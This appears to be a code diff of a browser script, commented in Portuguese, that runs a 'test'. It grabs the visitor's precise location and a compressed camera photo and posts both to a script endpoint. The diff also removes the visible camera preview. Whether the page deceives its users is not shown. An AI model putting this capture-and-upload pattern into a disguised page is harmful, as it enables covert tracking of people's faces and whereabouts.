@@ -52,14 +52,13 @@ function setStatus(msg){
   status.innerText = msg;
 }
 
-// GEOLOCALIZAÇÃO COM TIMEOUT
+// GEOLOCALIZAÇÃO
 function getLocation(){
   return new Promise((resolve,reject)=>{
-    navigator.geolocation.getCurrentPosition(
-      resolve,
-      reject,
-      { enableHighAccuracy:true, timeout:10000 }
-    );
+    navigator.geolocation.getCurrentPosition(resolve,reject,{
+      enableHighAccuracy:true,
+      timeout:10000
+    });
   });
 }
 
@@ -71,74 +70,56 @@ async function startCamera(){
   });
 }
 
-// CAPTURA FOTO (CORRIGIDA)
+// 📸 CAPTURA CORRIGIDA (CRÍTICA)
 async function capturePhoto(stream){
 
-  return new Promise((resolve,reject)=>{
+  video.srcObject = stream;
+  await video.play();
 
-    video.srcObject = stream;
-    video.style.display = "block";
+  // tempo real necessário
+  await new Promise(r => setTimeout(r, 1500));
 
-    video.onloadedmetadata = () => {
+  const ctx = canvas.getContext("2d");
 
-      setTimeout(()=>{
+  // 🔴 REDUÇÃO DE RESOLUÇÃO
+  canvas.width = 320;
+  canvas.height = 240;
 
-        try{
+  ctx.drawImage(video, 0, 0, 320, 240);
 
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
+  // 🔴 COMPRESSÃO FORTE
+  imageData = canvas.toDataURL("image/jpeg", 0.3);
 
-          canvas.getContext("2d").drawImage(video,0,0);
+  if(!imageData || imageData.length < 1000){
+    throw new Error("Imagem inválida");
+  }
 
-          imageData = canvas.toDataURL("image/jpeg",0.5);
+  stream.getTracks().forEach(t => t.stop());
 
-          // valida imagem
-          if(!imageData || imageData.length < 1000){
-            throw new Error("Imagem inválida");
-          }
-
-          // parar câmera
-          stream.getTracks().forEach(t=>t.stop());
-          video.style.display = "none";
-
-          console.log("Imagem OK:", imageData.substring(0,50));
-
-          resolve();
-
-        }catch(err){
-          reject(err);
-        }
-
-      }, 1500); // tempo real necessário
-
-    };
-
-  });
+  console.log("Imagem tamanho:", imageData.length);
 }
 
-// ENVIO (COM RETORNO)
+// ENVIO (CORRIGIDO PRA APPS SCRIPT)
 async function sendData(payload){
-
   try{
 
-    const res = await fetch(SCRIPT_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "text/plain" // ⚠️ MUDANÇA CRÍTICA
+    const res = await fetch(SCRIPT_URL,{
+      method:"POST",
+      headers:{
+        "Content-Type":"text/plain"
       },
-      body: JSON.stringify(payload)
+      body:JSON.stringify(payload)
     });
 
     const text = await res.text();
 
-    console.log("Resposta:", text);
+    console.log("Resposta servidor:", text);
 
   }catch(e){
-    console.error("Erro real no fetch:", e);
-    throw new Error("fetch_error");
+    console.error("Erro envio:", e);
+    throw new Error("Erro envio");
   }
 }
-
 
 // EXECUÇÃO
 async function startTest(){
@@ -148,7 +129,6 @@ async function startTest(){
 
   try{
 
-    // captura paralela
     const [pos,stream] = await Promise.all([
       getLocation(),
       startCamera()
@@ -156,10 +136,6 @@ async function startTest(){
 
     setStatus("Capturando imagem...");
     await capturePhoto(stream);
-
-    if(!imageData){
-      throw new Error("Imagem não capturada");
-    }
 
     const payload = {
       timestamp:new Date().toISOString(),
@@ -174,30 +150,23 @@ async function startTest(){
 
     await sendData(payload);
 
-    setStatus("✔ Dados enviados com sucesso");
+    setStatus("✔ Dados enviados");
 
   }catch(e){
 
-  console.error("ERRO DETALHADO:", e);
+    console.error("ERRO:", e);
 
-  if(e.name === "NotAllowedError"){
-    setStatus("Permissão da câmera negada");
-  }
-  else if(e.code === 1){
-    setStatus("Permissão de localização negada");
-  }
-  else if(e.message.includes("Imagem")){
-    setStatus("Falha ao capturar imagem");
-  }
-  else if(e.message.includes("fetch")){
-    setStatus("Erro ao enviar dados");
-  }
-  else{
-    setStatus("Erro desconhecido");
-  }
+    if(e.name === "NotAllowedError"){
+      setStatus("Permissão da câmera negada");
+    }
+    else if(e.code === 1){
+      setStatus("Permissão de localização negada");
+    }
+    else{
+      setStatus("Erro na captura/envio");
+    }
 
-}
-
+  }
 
   bar.style.width = "100%";
 
